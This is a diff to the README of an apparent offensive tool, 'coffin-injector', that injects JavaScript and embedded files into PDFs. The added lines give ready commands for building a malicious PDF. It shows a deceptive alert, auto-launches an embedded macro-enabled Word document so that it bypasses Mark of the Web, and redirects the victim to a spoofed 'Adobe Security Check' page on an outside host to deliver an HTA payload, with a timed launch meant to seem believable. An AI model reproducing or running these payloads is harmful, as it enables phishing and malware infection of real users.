@@ -42,7 +42,15 @@ python3 coffin-injector.py -i Resume.pdf -o poc.pdf -p 'var u=app.response("This
 This payload embeds a macro-enabled Word document into the PDF and injects a JavaScript trigger to export and launch the file when the PDF is opened. The `nLaunch: 1` parameter silently saves and auto-launches the embedded file without applying Mark of the Web, allowing macros to run if the user enables them in Office.
 
 ```bash
-python3 coffin-injector2.py -i Resume.pdf -o calc.pdf -p 'app.alert("This document includes an embedded application. Click OK to extract."); this.exportDataObject({ cName: "example.doc", nLaunch: 1 });' -e example.doc
+python3 coffin-injector.py -i landing.pdf -o doc_delivery.pdf -e Resume.doc -p 'app.alert("This document includes a securely embedded document. Click OK to extract."); this.exportDataObject({ cName: "Resume.doc", nLaunch: 1 });'
+```
+
+### Step 5: Run Coffin-Injector with Delayed Launch and External Redirection
+
+This example demonstrates a scenario where the user is redirected to a spoofed "Adobe Security Check" page, where another payload (such as a `.hta` file) is delivered. After a 7-second delay (long enough for the user to interact with the HTA), the PDF launches the embedded document. This enhances believability that the user's actions triggered the embedded document's appearance. Note, testing with longer delays tend to fail.
+
+```bash
+python3 coffin-injector.py -i landing.pdf -o hta_delivery.pdf -e Resume.doc -p "app.alert('To view this document, please run the Adobe Security Check. You\'ll now be redirected.'); app.launchURL('https://minipickle-kali.tail72258d.ts.net/Adobe_Security_Check.php'); app.setTimeOut('this.exportDataObject({ cName: \"Resume.doc\", nLaunch: 2 });', 7000);"
 ```
 
 ### 📦 Understanding `nLaunch` Behaviour
